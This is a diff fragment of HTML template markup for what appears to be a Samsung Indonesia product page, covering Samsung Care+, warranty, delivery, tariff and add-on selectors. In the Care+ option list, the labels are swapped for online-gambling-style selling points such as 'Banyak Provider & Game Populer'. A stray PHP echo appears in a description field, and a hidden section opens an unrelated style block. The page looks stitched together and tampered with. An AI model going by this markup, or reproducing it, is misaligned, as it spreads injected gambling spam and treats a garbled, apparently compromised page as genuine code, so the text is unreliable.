+          <button an-ac="pd buying tool" an-ca="option click" an-la="samsung care:learn more" an-tr="hdd02_product info.-product detail-option service selector-option_click" aria-haspopup="dialog" class="cta cta--underline-v2 cta--black add-special-tagging" data-sdf-attr.data-target-popup="{{care.learnMoreCta.layerTarget}}" data-sdf-attr.target="{{care.learnMoreCta.target}}" data-sdf-attr.title="{{care.learnMoreCta.title}}" data-sdf-test="{{care.learnMoreCta.isNotOutLink}}">
+           {{care.learnMoreCta.text}}
+          </button>
+          <a an-ac="pd buying tool" an-ca="option click" an-la="samsung care:learn more" an-tr="hdd02_product info.-product detail-option service selector-option_click" aria-haspopup="dialog" class="cta cta--underline-v2 cta--black cta--icon" data-sdf-attr.data-target-popup="{{care.learnMoreCta.layerTarget}}" data-sdf-attr.href="{{care.learnMoreCta.href}}" data-sdf-attr.target="{{care.learnMoreCta.target}}" data-sdf-attr.title="{{care.learnMoreCta.title}}" data-sdf-test="{{care.learnMoreCta.isOutLink}}" rel="nofollow">
+           {{care.learnMoreCta.text}}
+           <svg aria-hidden="true" class="icon" focusable="false">
+            <use href="#outlink-bold" xlink:href="#outlink-bold">
+            </use>
+           </svg>
+          </a>
+         </div>
+         <p class="pd-select-option__desc" data-sdf-test="{{care.description}}">
+          <?= $title; ?>
+         </p>
+         <p class="pd-select-option__notice pd-select-option__notice--normal checkingSamsungCare">
+          <svg aria-hidden="true" class="icon" focusable="false">
+           <use href="#information-error-bold" xlink:href="#information-error-bold">
+           </use>
+          </svg>
+          Tambah Samsung Care+ atau lanjutkan tanpa perlindungan extra
+         </p>
+         <div class="pd-select-option__wrap">
+          <ul class="pd-select-option__list pd-select-option__list--wide pd-select-option__list--samsung-care" role="list">
+           <li class="pd-select-option__item" role="listitem">
+            <div class="pd-option-selector">
+             <input an-ac="pd buying tool" an-ca="option click" an-la="samsung care:no" an-tr="hdd02_product info.-product detail-option service selector-option_click" class="hidden option-input add-special-tagging" data-event-type="{{care.noAttr.eventType}}" id="pd-samsung-care-0" name="pd-samsung-care" type="radio"/>
+             <label class="pd-option-selector__label" for="pd-samsung-care-0">
+              <span class="pd-option-selector__text-wrap">
+               <span class="pd-option-selector__text">
+                <strong class="pd-option-selector__main-text">
+                 Akses Cepat & Stabil
+                </strong>
+                <!-- CRHQ-3143 [B2C] ES - SC+ 개선 -->
+                <!-- CRHQ-3143 [B2C] ES - SC+ 개선 -->
+               </span>
+              </span>
+             </label>
+            </div>
+           </li>
+           <li class="pd-select-option__item" role="listitem">
+            <div class="pd-option-selector">
+             <input an-ac="pd buying tool" an-ca="option click" an-la="samsung care:no" an-tr="hdd02_product info.-product detail-option service selector-option_click" class="hidden option-input add-special-tagging" data-event-type="{{care.noAttr.eventType}}" id="pd-samsung-care-0" name="pd-samsung-care" type="radio"/>
+             <label class="pd-option-selector__label" for="pd-samsung-care-0">
+              <span class="pd-option-selector__text-wrap">
+               <span class="pd-option-selector__text">
+                <strong class="pd-option-selector__main-text">
+                 Banyak Provider & Game Populer
+                </strong>
+                <!-- CRHQ-3143 [B2C] ES - SC+ 개선 -->
+                <!-- CRHQ-3143 [B2C] ES - SC+ 개선 -->
+               </span>
+              </span>
+             </label>
+            </div>
+           </li>
+           <li class="pd-select-option__item" role="listitem">
+            <div class="pd-option-selector">
+             <input an-ac="pd buying tool" an-ca="option click" an-la="samsung care:no" an-tr="hdd02_product info.-product detail-option service selector-option_click" class="hidden option-input add-special-tagging" data-event-type="{{care.noAttr.eventType}}" id="pd-samsung-care-0" name="pd-samsung-care" type="radio"/>
+             <label class="pd-option-selector__label" for="pd-samsung-care-1">
+              <span class="pd-option-selector__text-wrap">
+               <span class="pd-option-selector__text">
+                <strong class="pd-option-selector__main-text">
+                 Sistem Keamanan Berlapis
+                </strong>
+                <!-- CRHQ-3143 [B2C] ES - SC+ 개선 -->
+                <!-- CRHQ-3143 [B2C] ES - SC+ 개선 -->
+               </span>
+              </span>
+             </label>
+            </div>
+           </li>
+           <li class="pd-select-option__item" role="listitem">
+            <div class="pd-option-selector">
+             <input an-ac="pd buying tool" an-ca="option click" an-la="samsung care:no" an-tr="hdd02_product info.-product detail-option service selector-option_click" class="hidden option-input add-special-tagging" data-event-type="{{care.noAttr.eventType}}" id="pd-samsung-care-0" name="pd-samsung-care" type="radio"/>
+             <label class="pd-option-selector__label" for="pd-samsung-care-1">
+              <span class="pd-option-selector__text-wrap">
+               <span class="pd-option-selector__text">
+                <strong class="pd-option-selector__main-text">
+                 Support 24/7 Ramah & Responsif
+                </strong>
+                <!-- CRHQ-3143 [B2C] ES - SC+ 개선 -->
+                <!-- CRHQ-3143 [B2C] ES - SC+ 개선 -->
+               </span>
+              </span>
+             </label>
+            </div>
+           </li>
+           <li class="pd-select-option__item" role="listitem">
+            <div class="pd-option-selector">
+             <input an-ac="pd buying tool" an-ca="option click" an-la="samsung care:no" an-tr="hdd02_product info.-product detail-option service selector-option_click" class="hidden option-input add-special-tagging" data-event-type="{{care.noAttr.eventType}}" id="pd-samsung-care-0" name="pd-samsung-care" type="radio"/>
+             <label class="pd-option-selector__label" for="pd-samsung-care-1">
+              <span class="pd-option-selector__text-wrap">
+               <span class="pd-option-selector__text">
+                <strong class="pd-option-selector__main-text">
+                 Tampilan Bersih & Mudah Dipahami
+                </strong>
+                <!-- CRHQ-3143 [B2C] ES - SC+ 개선 -->
+                <!-- CRHQ-3143 [B2C] ES - SC+ 개선 -->
+               </span>
+              </span>
+             </label>
+            </div>
+           </li>
+          </ul>
+         </div>
+        </div>
+        <div class="option-result-dev hidden result-care sdf-component-template" data-sdf-template=" careResult @ drawObj " data-sdf-unwrap="true">
+         <input class="hidden result-price" data-sdf-attr.data-id="{{careResult.dataId}}" data-sdf-attr.data-model-code="{{careResult.dataModelCode}}" data-sdf-attr.data-model-name="{{careResult.dataModelName}}" data-sdf-attr.data-price="{{careResult.dataPrice}}" data-sdf-attr.data-sale-price="{{careResult.dataSalePrice}}" type="hidden"/>
+        </div>
+        <div class="pd-select-option option-warranty sdf-component-template" data-sdf-template="warranty @ drawObj" data-sdf-test="{{warranty.hasComponent}}" data-sdf-unwrap="true">
+         <div class="pd-select-option__headline-wrap">
+          <h3 class="pd-select-option__headline" data-sdf-test="{{warranty.title}}">
+           {{warranty.title}}
+          </h3>
+          <span class="pd-select-option__cta-wrap" data-sdf-test="{{warranty.learnMoreCta.text}}">
+           <button an-ac="pd buying tool" an-ca="option click" an-la="extended warranty:learn more" an-tr="hdd02_product info.-product detail-option service selector-option_click" aria-haspopup="dialog" class="cta cta--underline-v2 cta--black add-special-tagging" data-sdf-attr.data-target-popup="{{warranty.learnMoreCta.layerTarget}}" data-sdf-attr.target="{{warranty.learnMoreCta.target}}" data-sdf-attr.title="{{warranty.learnMoreCta.title}}" data-sdf-test="{{ warranty.learnMoreCta.isNotOutLink}}" href="#" rel="nofollow">
+            {{warranty.learnMoreCta.text}}
+           </button>
+           <a an-ac="pd buying tool" an-ca="option click" an-la="extended warranty:learn more" an-tr="hdd02_product info.-product detail-option service selector-option_click" aria-haspopup="dialog" class="cta cta--underline-v2 cta--black cta--icon" data-sdf-attr.data-target-popup="{{warranty.learnMoreCta.layerTarget}}" data-sdf-attr.target="{{warranty.learnMoreCta.target}}" data-sdf-attr.title="{{warranty.learnMoreCta.title}}" data-sdf-test="{{warranty.learnMoreCta.isOutLink}}">
+            {{warranty.learnMoreCta.text}}
+            <svg aria-hidden="true" class="icon" focusable="false">
+             <use href="#outlink-bold" xlink:href="#outlink-bold">
+             </use>
+            </svg>
+           </a>
+          </span>
+         </div>
+         <p class="pd-select-option__desc" data-sdf-test="{{warranty.description}}">
+          {{warranty.description}}
+         </p>
+         <div class="pd-select-option__wrap">
+          <ul class="pd-select-option__list" role="list">
+           <li class="pd-select-option__item" role="listitem">
+            <div class="pd-option-selector">
+             <input an-ac="pd buying tool" an-ca="option click" an-la="extended warranty:yes" an-tr="hdd02_product info.-product detail-option service selector-option_click" class="hidden option-input add-special-tagging {{warranty.yesAttr.class}}" data-target-popup="{{warranty.yesAttr.layerTarget}}" id="pd-samsung-warranty-0" name="pd-samsung-warranty" type="radio"/>
+             <label class="pd-option-selector__label" for="pd-samsung-warranty-0">
+              <span class="pd-option-selector__text-wrap">
+               <span class="pd-option-selector__text">
+                <strong class="pd-option-selector__main-text">
+                 {{warranty.yesAttr.text}}
+                </strong>
+                <span class="pd-option-selector__sub-text">
+                 {{warranty.yesAttr.subText}}
+                </span>
+               </span>
+              </span>
+             </label>
+            </div>
+           </li>
+           <li class="pd-select-option__item" role="listitem">
+            <div class="pd-option-selector">
+             <input an-ac="pd buying tool" an-ca="option click" an-la="extended warranty:no" an-tr="hdd02_product info.-product detail-option service selector-option_click" class="hidden option-input add-special-tagging {{warranty.noAttr.class}}" data-event-type="{{warranty.noAttr.eventType}}" data-target-popup="{{warranty.noAttr.layerTarget}}" id="pd-samsung-warranty-1" name="pd-samsung-warranty" type="radio"/>
+             <label class="pd-option-selector__label" for="pd-samsung-warranty-1">
+              <span class="pd-option-selector__text-wrap">
+               <span class="pd-option-selector__text">
+                <strong class="pd-option-selector__main-text">
+                 {{warranty.noAttr.text}}
+                </strong>
+               </span>
+              </span>
+             </label>
+            </div>
+           </li>
+          </ul>
+         </div>
+        </div>
+        <div class="option-result result-warranty sdf-component-template" data-sdf-template=" warrantyResult @ drawObj " data-sdf-unwrap="true">
+         <div class="option-result__text-wrap result-price" data-sdf-attr.data-id="{{warrantyResult.dataId}}" data-sdf-attr.data-model-code="{{warrantyResult.dataModelCode}}" data-sdf-attr.data-model-name="{{warrantyResult.dataModelName}}" data-sdf-attr.data-price="{{warrantyResult.dataPrice}}" data-sdf-attr.data-sale-price="{{warrantyResult.dataSalePrice}}">
+          <p class="option-result__text-title" data-sdf-test="{{warrantyResult.displayModelName}}">
+           {{warrantyResult.displayModelName}}
+          </p>
+          <p class="option-result__text" data-sdf-test="{{warrantyResult.discountText1}}">
+           {{warrantyResult.discountText1}}
+          </p>
+         </div>
+         <div class="option-result__desc-wrap" data-sdf-test="{{warrantyResult.description1}}">
+          <p class="option-result__desc">
+           {{warrantyResult.description1}}
+          </p>
+         </div>
+         <a class="option-result__close remove-warranty-result" href="javascript:void(0)">
+          <span class="hidden">
+           Tutup
+          </span>
+          <svg class="icon" focusable="false" viewbox="0 0 96 96">
+           <path d="M79.17 11.17L48 42.34 16.83 11.17l-5.66 5.66L42.34 48 11.17 79.17l5.66 5.66L48 53.66l31.17 31.17 5.66-5.66L53.66 48l31.17-31.17z">
+           </path>
+          </svg>
+         </a>
+        </div>
+        <div class="pd-select-option option-warranty-vd sdf-component-template" data-sdf-template="warrantyVd @ drawObj" data-sdf-test="{{warrantyVd.hasComponent}}" data-sdf-unwrap="true">
+         <div class="pd-select-option__headline-wrap">
+          <h3 class="pd-select-option__headline">
+           {{warrantyVd.title}}
+          </h3>
+          <span class="pd-select-option__cta-wrap">
+           <a an-ac="pd buying tool" an-ca="option click" an-la="extended warranty:learn more" an-tr="hdd02_product info.-product detail-option service selector-option_click" aria-haspopup="dialog" class="cta cta--underline-v2 cta--black cta--icon" data-sdf-attr.data-target-popup="{{warrantyVd.learnMoreCta.learnMoreTargetPopup}}" data-sdf-attr.href="{{warrantyVd.learnMoreCta.learnMoreHref}}" data-sdf-attr.target="{{warrantyVd.learnMoreCta.learnMoreTarget}}">
+            {{warrantyVd.learnMoreCta.learnMoreText}}
+            <svg aria-hidden="true" class="icon" focusable="false">
+             <use href="#outlink-bold" xlink:href="#outlink-bold">
+             </use>
+            </svg>
+           </a>
+          </span>
+         </div>
+         <p class="pd-select-option__desc">
+          {{warrantyVd.description}}
+         </p>
+         <div class="pd-select-option__wrap">
+          <ul class="pd-select-option__list pd-select-option__list--wide" role="list">
+           <li class="pd-select-option__item" role="listitem">
+            <div class="pd-option-selector">
+             <input an-ac="pd buying tool" an-ca="option click" an-la="extended warranty:yes" an-tr="hdd02_product info.-product detail-option service selector-option_click" aria-haspopup="dialog" checked="" class="hidden" data-target-popup="{{warrantyVd.yesAttr.layerTarget}}" id="pd-extended-warranty-option-0" name="pd-extended-warranty-option" type="radio"/>
+             <label class="pd-option-selector__label" for="pd-extended-warranty-option-0">
+              <span class="pd-option-selector__text-wrap">
+               <span class="pd-option-selector__text">
+                <strong class="pd-option-selector__main-text">
+                 {{warrantyVd.yesAttr.text}}
+                </strong>
+               </span>
+              </span>
+             </label>
+            </div>
+           </li>
+           <li class="pd-select-option__item" role="listitem">
+            <div class="pd-option-selector">
+             <input an-ac="pd buying tool" an-ca="option click" an-la="extended warranty:no" an-tr="hdd02_product info.-product detail-option service selector-option_click" class="hidden option-result-focus" id="pd-extended-warranty-option-1" name="pd-extended-warranty-option" type="radio"/>
+             <label class="pd-option-selector__label" for="pd-extended-warranty-option-1">
+              <span class="pd-option-selector__text-wrap">
+               <span class="pd-option-selector__text">
+                <strong class="pd-option-selector__main-text">
+                 {{warrantyVd.noAttr.text}}
+                </strong>
+               </span>
+              </span>
+             </label>
+            </div>
+           </li>
+          </ul>
+         </div>
+        </div>
+        <div class="option-result option-result--extended-warranty-option sdf-component-template" data-sdf-template="warrantyVdResult @ drawObj" data-sdf-unwrap="true">
+         <div class="option-result__text-wrap" data-sdf-attr.data-model-code="{{warrantyVdResult.smcCode}}" data-sdf-attr.data-price="{{warrantyVdResult.price}}">
+          <p class="option-result__text-title">
+           {{warrantyVdResult.title}}
+          </p>
+          <p class="option-result__text">
+           {{warrantyVdResult.priceDisplay}}
+          </p>
+         </div>
+         <a an-ac="pd buying tool" an-ca="option click" an-la="extended warranty:delete" an-tr="hdd02_product info.-product detail-option service selector-option_click" class="option-result__close" href="javascript:void(0)">
+          <span class="hidden">
+           Close
+          </span>
+          <svg aria-hidden="true" class="icon" focusable="false" viewbox="0 0 96 96">
+           <path d="M79.17 11.17L48 42.34 16.83 11.17l-5.66 5.66L42.34 48 11.17 79.17l5.66 5.66L48 53.66l31.17 31.17 5.66-5.66L53.66 48l31.17-31.17z">
+           </path>
+          </svg>
+         </a>
+        </div>
+        <!-- (2021.02.08 추가) Tooltip 기능 추가 -->
+        <div class="pd-select-option pd-select-option--delivery-detail sdf-component-template" data-sdf-template="delivery @ drawObj" data-sdf-test="{{delivery.hasComponent}}" data-sdf-unwrap="true">
+         <div class="pd-select-option__headline-wrap">
+          <h3 class="pd-select-option__headline">
+           {{delivery.headline}}
+          </h3>
+         </div>
+         <div class="pd-select-option__input-wrap">
+          <div class="text-field-v2 no-title {{delivery.labelClass}}">
+           <label class="text-field-v2__hint" for="delivery-zipcode">
+            {{delivery.label}}
+           </label>
+           <div class="text-field-v2__input-wrap">
+            <input autocomplete="off" class="text-field-v2__input" data-sdf-attr.disabled="{{delivery.inputAttr.disabled}}" data-sdf-attr.maxlength="{{delivery.inputAttr.maxlength}}" data-sdf-attr.value="{{delivery.inputAttr.value}}" id="delivery-zipcode" type="text"/>
+            <button an-ac="pd buying tool" an-ca="option click" an-la="zip code:delete" an-tr="header(pim)_option selector-product detail-image-submit" class="text-field-v2__input-icon delete add-special-tagging" title="Delete">
+             <svg class="icon delete" focusable="false">
+              <use href="#cancel-bold" xlink:href="#cancel-bold">
+              </use>
+             </svg>
+            </button>
+           </div>
+           <p class="text-field-v2__text error">
+            {{delivery.errorMessage}}
+           </p>
+          </div>
+          <a an-ac="pd buying tool" an-ca="option click" an-la="delivery details:Apply" an-tr="hdd02_product info.-product detail-apply cta-option_click1" class="cta cta--contained cta--black check-zipcode {{delivery.ctaClass}}" href="javascript:void(0)" title="Apply">
+           Terapkan
+          </a>
+         </div>
+        </div>
+        <div class="option-result result-delivery sdf-component-template" data-sdf-template="deliveryResult @ drawObj" data-sdf-unwrap="true">
+         <div class="option-result__text-wrap">
+          <p class="option-result__text delivery-priority" data-sdf-test="{{deliveryResult.priorityText}}">
+           {{deliveryResult.priorityText}}
+          </p>
+          <p class="option-result__text delivery-standard" data-sdf-test="{{deliveryResult.mainText}}">
+           {{deliveryResult.mainText}}
+          </p>
+          <p class="option-result__sub-text" data-sdf-test="{{deliveryResult.subText}}">
+           {{deliveryResult.subText}}
+           <br/>
+           Standard installation charges may apply.
+           <a aria-label="Link Title" class="option-result__text-link" href="https://images.samsung.com/is/content/samsung/assets/in/info/installation/Delivery-Service-TnC.pdf" target="_blank">
+            Click here
+           </a>
+           for more details.
+          </p>
+         </div>
+         <div class="option-result__desc-wrap">
+          <p class="option-result__desc-title" data-sdf-test="{{deliveryResult.decText}}">
+           {{deliveryResult.decText}}
+          </p>
+          <p class="option-result__desc" data-sdf-repeat.item="{{deliveryResult.disclaimerList}}">
+           {{item.disclaimer}}
+          </p>
+         </div>
+         <a an-ac="pd buying tool" an-ca="option click" an-la="delivery details:delete" an-tr="hdd02_product info.-product detail-option selector-option_click1" class="option-result__close remove-delivery" href="javascript:void(0)">
+          <span class="hidden">
+           Tutup
+          </span>
+          <svg aria-hidden="true" class="icon" focusable="false">
+           <use href="#delete-bold" xlink:href="#delete-bold">
+           </use>
+          </svg>
+         </a>
+        </div>
+        <div class="pd-select-option option-tariff sdf-component-template" data-sdf-template="tariffOption @ drawObj" data-sdf-test="{{tariffOption.hasComponent}}" data-sdf-unwrap="true">
+         <div class="pd-select-option__headline-wrap">
+          <h3 class="pd-select-option__headline">
+           {{tariffOption.headline}}
+          </h3>
+          <span class="pd-select-option__cta-wrap" data-sdf-test="{{tariffOption.href}}">
+           <a an-ac="pd buying tool" an-ca="option click" an-la="tariff:learn more" an-tr="hdd02_product info.-product detail-option service selector-option_click" aria-haspopup="dialog" class="cta cta--underline-v2 cta--black cta--icon add-special-tagging" data-sdf-attr.href="{{tariffOption.href}}" rel="nofollow" role="button" target="_blank" title="Lebih detail">
+            Lebih detail
+            <svg aria-hidden="true" class="icon" focusable="false">
+             <use href="#outlink-bold" xlink:href="#outlink-bold">
+             </use>
+            </svg>
+           </a>
+          </span>
+         </div>
+         <p class="pd-select-option__desc">
+          {{tariffOption.description}}
+         </p>
+         <p class="pd-select-option__carrier" data-sdf-list.logoitem="{{tariffOption.logoList}}">
+          <img class="carrier-logo" data-sdf-attr.alt="{{logoitem.alt}}" data-sdf-attr.src="{{logoitem.src}}"/>
+         </p>
+         <div class="pd-select-option__wrap">
+          <ul class="pd-select-option__list" role="list">
+           <li class="pd-select-option__item" role="listitem">
+            <div class="pd-option-selector">
+             <input an-ac="pd buying tool" an-ca="option click" an-la="tariff:yes" an-tr="hdd02_product info.-product detail-option service selector-option_click" aria-haspopup="dialog" checked="" class="hidden option-input add-special-tagging" data-target-popup="tariffPopup" id="pd-tariff-option-0" name="pd-tariff-option" type="radio"/>
+             <label class="pd-option-selector__label" for="pd-tariff-option-0">
+              <span class="pd-option-selector__text-wrap">
+               <span class="pd-option-selector__text">
+                <span class="pd-option-selector__main-text">
+                 {{tariffOption.yesAttr.text}}
+                </span>
+               </span>
+              </span>
+             </label>
+            </div>
+           </li>
+           <li class="pd-select-option__item" role="listitem">
+            <div class="pd-option-selector">
+             <input an-ac="pd buying tool" an-ca="option click" an-la="tariff:no" an-tr="hdd02_product info.-product detail-option service selector-option_click" class="hidden option-input add-special-tagging" id="pd-tariff-option-1" name="pd-tariff-option" type="radio"/>
+             <label class="pd-option-selector__label" for="pd-tariff-option-1">
+              <span class="pd-option-selector__text-wrap">
+               <span class="pd-option-selector__text">
+                <span class="pd-option-selector__main-text">
+                 {{tariffOption.noAttr.text}}
+                </span>
+               </span>
+              </span>
+             </label>
+            </div>
+           </li>
+          </ul>
+         </div>
+        </div>
+        <div class="option-result result-tariff-option sdf-component-template" data-sdf-template="tariffOptionResult @ drawObj" data-sdf-test="{{tariffOptionResult.hasComponent}}" data-sdf-unwrap="true">
+         <div class="option-result__text-wrap result-price" data-sdf-attr.data-id="{{tariffOptionResult.dataId}}" data-sdf-attr.data-model-code="{{tariffOptionResult.dataModelCode}}" data-sdf-attr.data-price="{{tariffOptionResult.dataPrice}}" data-sdf-attr.data-simsku-code="{{tariffOptionResult.dataSimskuCode}}">
+          <p class="option-result__text-title" data-sdf-test="{{tariffOptionResult.displayModelName}}">
+           {{tariffOptionResult.displayModelName}}
+          </p>
+          <p class="option-result__text" data-sdf-test="{{tariffOptionResult.discountText1}}">
+           {{tariffOptionResult.discountText1}}
+          </p>
+         </div>
+         <div class="option-result__desc-wrap" data-sdf-test="{{tariffOptionResult.description1}}">
+          <p class="option-result__desc">
+           {{tariffOptionResult.description1}}
+          </p>
+          <p class="option-result__desc">
+           {{tariffOptionResult.description2}}
+          </p>
+         </div>
+         <a class="option-result__close remove-tariff-option-result" href="javascript:void(0)">
+          <span class="hidden">
+           Tutup
+          </span>
+          <svg class="icon" focusable="false" viewbox="0 0 96 96">
+           <path d="M79.17 11.17L48 42.34 16.83 11.17l-5.66 5.66L42.34 48 11.17 79.17l5.66 5.66L48 53.66l31.17 31.17 5.66-5.66L53.66 48l31.17-31.17z">
+           </path>
+          </svg>
+         </a>
+         <p class="option-result__desc">
+          {{tariffOptionResult.description}}
+         </p>
+         <p class="option-result__price" data-sdf-attr.data-id="{{tariffOptionResult.dataId}}" data-sdf-attr.data-model-code="{{tariffOptionResult.dataModelCode}}" data-sdf-attr.data-price="{{tariffOptionResult.dataPrice}}" data-sdf-attr.data-simsku-code="{{tariffOptionResult.dataSimskuCode}}">
+          {{tariffOptionResult.price}}
+         </p>
+         <p class="option-result__disclaimer">
+          {{tariffOptionResult.disclaimer}}
+         </p>
+        </div>
+        <div class="pd-select-option option-embed-addon sdf-component-template" data-sdf-template="embedAddon @ drawObj" data-sdf-test="{{embedAddon.hasComponent}}" data-sdf-unwrap="true">
+         <h3 class="pd-select-option__headline">
+          {{embedAddon.title}}
+         </h3>
+         <p class="pd-select-option__desc">
+          {{embedAddon.description}}
+         </p>
+         <ul class="add-on-product-list-wrap" data-sdf-test="{{embedAddon.isNotVDSTEPBUYING}}" data-total-price="0" data-total-sale-price="0">
+          <li class="add-on-product{{item.oosClass}}" data-sdf-repeat.item="{{embedAddon.itemSet}}">
+           <div class="checkbox-v2">
+            <input an-ac="pd buying tool" an-ca="option click" an-la="add on product purchase only:{{item.nameToLowerCase}}" class="checkbox-v3__input" data-modelcode="{{item.modelCode}}" data-modelname="{{item.groupCode}}" id="add-on-product-{{item.index}}" name="checkbox" type="checkbox"/>
+            <label class="checkbox-v3__label" for="add-on-product-{{item.index}}">
+             <span class="checkbox-v3__label-box-wrap">
+              <span class="checkbox-v3__label-box">
+               <svg aria-hidden="true" class="checkbox-v3__label-box-icon" focusable="false">
+                <use href="#done-bold" xlink:href="#done-bold">
+                </use>
+               </svg>
+              </span>
+             </span>
+             <span class="checkbox-v3__label-text">
+              {{item.name}}
+             </span>
+            </label>
+           </div>
+           <div class="add-on-product__image">
+            <div class="image">
+             <img alt="{{item.imgAlt}}" class="image__preview lazy-load" data-src="{{item.imgSrc}}" role="img"/>
+             <img alt="{{item.imgAlt}}" class="image__main lazy-load" data-src="{{item.imgSrc}}" role="img"/>
+            </div>
+           </div>
+           <div class="add-on-product__detail-wrap">
+            <div class="add-on-product__text-wrap">
+             <span class="badge-icon badge-icon--label-v2 {{item.iconClass}}" data-sdf-test="{{item.iconClass}}">
+              {{item.iconTitle}}
+             </span>
+             <p class="add-on-product__title" data-model-name="{{item.name}}">
+              {{item.name}}
+             </p>
+             <p class="add-on-product__serial-number" data-model-code="{{item.modelCode}}" data-sdf-test="{{item.modelCode}}">
+              {{item.modelCode}}
+             </p>
+             <p class="add-on-product__desc" data-sdf-test="{{item.description}}">
+              {{item.description}}
+             </p>
+            </div>
+            <div class="add-on-product__price-wrap">
+             <p class="add-on-product__final-price" data-price="{{item.finalPriceValue}}">
+              {{item.finalPrice}}
+             </p>
+             <del class="add-on-product__original-price" data-original-price="{{item.originalPriceValue}}" data-sdf-test="{{item.originalPrice}}">
+              {{item.originalPrice}}
+             </del>
+             <span class="add-on-product__saving-price" data-save-price="{{item.savePriceValue}}" data-sdf-test="{{item.savePrice}}">
+              {{item.savePrice}}
+             </span>
+             <span class="add-on-product__out-of-stock" data-sdf-test="{{item.isOOS}}">
+              Habis
+             </span>
+            </div>
+            <button aria-label="Learn More" class="cta cta--underline-v2 cta--black cta-learn-more" data-model-idx="{{item.index}}" data-sdf-test="{{item.isLearnMorePopup}}">
+             Lebih detail
+            </button>
+           </div>
+          </li>
+         </ul>
+         <ul class="add-on-product-list-wrap add-on-product-list-wrap--vd" data-sdf-test="{{embedAddon.isVDSTEPBUYING}}" data-total-price="0" data-total-sale-price="0">
+          <li class="add-on-product{{item.oosClass}}{{item.hideClass}}" data-sdf-repeat.item="{{embedAddon.itemSet}}" data-view-more-item="true">
+           <div class="add-on-product__image">
+            <div class="image">
+             <img alt="{{item.imgAlt}}" class="image__preview lazy-load responsive-img" data-comp-name="image" data-desktop-src="" data-mobile-src="" data-src="" role="img"/>
+             <img alt="{{item.imgAlt}}" class="image__main lazy-load responsive-img lazy-load" data-comp-name="image" data-desktop-src="{{item.imgSrc}}?$72_72_PNG$" data-mobile-src="{{item.imgSrc}}?$128_128_PNG$" data-src="{{item.imgSrc}}" role="img"/>
+            </div>
+           </div>
+           <div class="add-on-product__detail-wrap">
+            <div class="add-on-product__text-wrap">
+             <span class="badge-icon badge-icon--label-v2 {{item.iconClass}}" data-sdf-test="{{item.iconClass}}">
+              {{item.iconTitle}}
+             </span>
+             <p class="add-on-product__title" data-model-name="{{item.name}}">
+              {{item.name}}
+             </p>
+             <p class="add-on-product__desc" data-sdf-test="{{item.description}}">
+              {{item.description}}
+             </p>
+             <ul class="add-on-product__dot-list" data-sdf-test="{{item.dotList1}}">
+              <li data-sdf-test="{{item.dotList1}}">
+               {{item.dotList1}}
+              </li>
+              <li data-sdf-test="{{item.dotList2}}">
+               {{item.dotList2}}
+              </li>
+              <li data-sdf-test="{{item.dotList3}}">
+               {{item.dotList3}}
+              </li>
+             </ul>
+            </div>
+            <div class="add-on-product__price-wrap">
+             <p class="add-on-product__final-price" data-price="{{item.finalPriceValue}}">
+              {{item.finalPrice}}
+             </p>
+             <del class="add-on-product__original-price" data-original-price="{{item.originalPriceValue}}" data-sdf-test="{{item.originalPrice}}">
+              {{item.originalPrice}}
+             </del>
+             <span class="add-on-product__saving-price" data-save-price="{{item.savePriceValue}}" data-sdf-test="{{item.savePrice}}">
+              {{item.savePrice}}
+             </span>
+             <span class="add-on-product__out-of-stock" data-sdf-test="{{item.isOOS}}">
+              Habis
+             </span>
+            </div>
+            <button an-ac="pd buying tool" an-ca="option click" an-la="add-on:add item" an-tr="hdd02_pdp header-product detail-add item-option_click" aria-label="Add" class="cta cta--outlined cta--black embed-addon-add" data-id="add-on-product-{{item.index}}" data-mode-code="{{item.modelCode}}" data-sdf-test="{{item.isStock}}">
+             Tambah
+            </button>
+            <button an-ac="pd buying tool" an-ca="option click" an-la="add-on:add item" an-tr="hdd02_pdp header-product detail-add item-option_click" aria-label="Add" class="cta cta--outlined cta--black cta--disabled embed-addon-add" data-sdf-test="{{item.isOOS}}" disabled="">
+             Tambah
+            </button>
+           </div>
+          </li>
+         </ul>
+         <div class="pd-select-option__view-more" data-sdf-test="{{embedAddon.useMobileCTA}}">
+          <button aria-expanded="false" class="cta cta--icon" data-js-action="offerListViewMore" data-text-close="Lihat sedikit" data-text-open="Lihat selengkapnya" type="button">
+           <span class="pd-select-option__view-more-text">
+            Lihat selengkapnya
+           </span>
+           <svg aria-hidden="true" class="icon" focusable="false">
+            <use href="#open-down-regular" xlink:href="#open-down-regular">
+            </use>
+           </svg>
+          </button>
+         </div>
+        </div>
+        <div data-sdf-template="offerContent_promotionMessage @ message" data-sdf-unwrap="true">
+         <div class="dot-list__text-wrap {{message.item.contentWrapperClass}}">
+          <span class="dot-list__text" data-sdf-test="{{message.item.offerTitle}}">
+           {{message.item.offerTitle}}
+          </span>
+          <span class="dot-list__tooltip" data-sdf-test="{{message.item.offerTooltip}}">
+           <button aria-describedby="descTip" class="dot-list__tooltip-cta">
+            <span class="hidden">
+             ?
+            </span>
+           </button>
+           <span class="dot-list__tooltip-message" id="descTip" role="tooltip">
+            <span class="dot-list__tooltip-message-text">
+             {{message.item.offerTooltip}}
+            </span>
+            <button class="dot-list__tooltip-close">
+             <span class="hidden">
+              Close
+             </span>
+             <svg aria-hidden="true" class="icon icon-delete" focusable="false">
+              <use href="#cancel-close-regular" xlink:href="#cancel-close-regular">
+              </use>
+             </svg>
+            </button>
+           </span>
+          </span>
+          <a an-ac="pd buying tool" an-ca="option click" an-la="offers:{{message.item.title}}:{{message.item.linkText}}" an-tr="hdd02_product info.-product detail-offers-option_click1" class="cta cta--underline-v2 cta--black" data-sdf-attr.href="{{message.item.linkUrl}}" data-sdf-attr.title="{{message.item.linkText}}" data-sdf-test="{{message.item.linkEnabled}}">
+           {{message.item.linkText}}
+          </a>
+         </div>
+         <p class="dot-list__desc" data-sdf-test="{{message.item.hasTCCTA}}">
+          {{message.item.tcCTAText}}
+         </p>
+         <p class="dot-list__desc" data-sdf-test="{{message.item.hasPeriod}}">
+          {{message.item.periodText}}
+         </p>
+        </div>
+       </div>
+       <!--googleon: all-->
+      </div>
+    <div class="pd-g-feature-benefit-ux2 pd-g-feature-benefit">
+     <!-- isNotBuyingPd-->
+     <!-- FaqSeo -->
+    </div>
+    <div class="pd-g-reasons-to-buy-ux2">
+     <input id="rtbListSize" name="rtbListSize" type="hidden" value="4"/>
+     <section class="pdd28-reasons-to-buy pdd28-reasons-to-buy--theme-white-card" style="display:none;">
+
+<style>
+  .lx-container{
+    max-width:1180px;
+    margin:42px auto;
+    padding:0 16px;
+    font-family:Inter,system-ui,-apple-system,"Segoe UI",Arial,sans-serif;
+  }
+
+  .lx-container *{
+    box-sizing:border-box;
+  }
+
